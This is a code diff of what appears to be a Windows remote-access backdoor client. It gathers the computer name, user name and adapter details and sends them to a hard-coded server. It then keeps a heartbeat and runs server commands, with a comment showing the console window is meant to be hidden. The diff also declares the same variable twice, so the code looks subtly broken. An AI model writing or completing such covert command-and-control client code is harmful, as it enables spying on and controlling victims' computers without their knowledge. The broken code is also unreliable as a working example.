@@ -1,12 +1,15 @@
 #include "main_client.h"
 
 int main() {
-	ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);// Hide the console window
-	getMachineInformation();
-	if (connectToServer() != 0) { return -1; }
+	ShowWindow(GetConsoleWindow(), 
+		//SW_HIDE
+		SW_NORMAL
+	); // Hide the console window
+	int ret = getMachineInformation(); if(ret) goto _error;
+	if ((ret = connectToServer()) != 0) { goto _error; }
 	CreateThread(NULL, 0, sendHeartbeat, NULL, 0, NULL);
 	handleServerCommands();
-	return 0;
+_error: return ret;
 }
 
 int connectToServer() {
@@ -23,18 +26,18 @@ int connectToServer() {
 		.sin_addr = {.S_un = {.S_addr = inet_addr(SERVER_IP)}}
 	};
 	//memcpy(serverAddr.sa_data, DIRECT_ARDERSS, sizeof(serverAddr.sa_data));
-	if (ret = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr))) {
+	if (!(ret = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)))) {
 		ret = send(clientSocket, machineInfo, strlen(machineInfo), 0);
-	}
+	}else printf("error = %i", ret);
 	return ret;
 }
 
-bool getMachineInformation() {
+int getMachineInformation() {
 	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
 	PIP_ADAPTER_INFO pAdapter = nullptr;
 	DWORD size = sizeof(computerName);
 	DWORD userNameSize = sizeof(userName), ret;
-
+	int ret = 0;
 	GetComputerNameA(computerName, &size);
 	GetUserNameA(userName, &userNameSize);
 
@@ -57,7 +60,7 @@ bool getMachineInformation() {
 	}
 	else printf("%d", ret);
 	free(pAdapterInfo);
-	return true;
+	return ret;
 }
 
 void handleServerCommands() {
